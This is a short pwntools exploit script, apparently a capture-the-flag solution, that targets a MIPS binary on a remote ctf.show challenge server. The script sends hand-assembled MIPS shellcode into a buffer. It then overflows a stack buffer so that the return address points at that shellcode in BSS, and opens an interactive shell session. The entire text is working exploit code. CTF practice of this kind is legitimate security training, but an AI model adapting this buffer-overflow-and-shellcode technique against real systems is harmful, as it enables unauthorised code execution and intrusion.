from pwn import *
r = remote("pwn.challenge.ctf.show",28109)
pause()
context.log_level = 'debug'
context.arch = 'mips'
bss = 0x00410c20+0x10
shellcode = b"A"*0x10 + b"\x20\x20\x40\x00\x00\x00\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x20\x20\x40\x00\x01\x00\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x20\x20\x40\x00\x02\x00\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00"
print(shellcode)
payload = b"a"*0x30 + p32(bss) + p32(bss)
r.recvuntil(b"Name:\n")
r.sendline(shellcode)
r.recvuntil(b"message:\n")
r.sendline(payload)
r.interactive()